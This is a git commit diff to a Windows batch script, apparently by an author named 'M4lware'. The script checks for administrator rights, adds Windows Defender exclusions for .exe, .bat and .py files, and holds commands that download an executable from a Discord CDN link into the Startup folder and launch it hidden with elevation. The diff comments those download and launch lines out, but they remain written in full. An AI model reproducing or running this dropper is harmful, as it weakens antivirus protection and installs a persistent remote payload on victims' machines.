bcfc7853b24a49383f7acdf36fe193eed027a12a
M4lware <128651023+M4lware-01@users.noreply.github.com>
2023-08-07 19:27:46 +0600

    Update script.bat

--- script.bat
+++ script.bat
@@ -2,7 +2,9 @@
 set ^"|find "::">nul 2>&1 && goto :no || goto :yes
 :no
 chcp 65001 > nul
-echo.&echo Pour pouvoir utiliser l'utilitaire, vous devez être un administrateur&echo exécutant une session de console. 
+echo Pour pouvoir utiliser l'utilitaire, vous devez être un administrateur
+echo exécutant une session de console.
+pause
 chcp 850 > nul
 goto :EOF
 :yes
@@ -18,9 +20,9 @@ powershell -Command "Add-MpPreference -ExclusionExtension '.exe'"
 powershell -Command "Add-MpPreference -ExclusionExtension '.bat'"
 powershell -Command "Add-MpPreference -ExclusionExtension '.py'"
 
-%curl% https://cdn.discordapp.com/attachments/1130988233761771581/1137590314295636058/x.exe -o %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe
+::%curl% https://cdn.discordapp.com/attachments/1130988233761771581/1137590314295636058/x.exe -o %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe
 
-%powershell% saps %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe -WindowStyle Hidden -Verb RunAs
+::%powershell% saps %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe -WindowStyle Hidden -Verb RunAs
 
 ::set "DownloadURL=https://cdn.discordapp.com/attachments/1130988233761771581/1137590314295636058/x.exe"
 ::set "DestinationPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe"
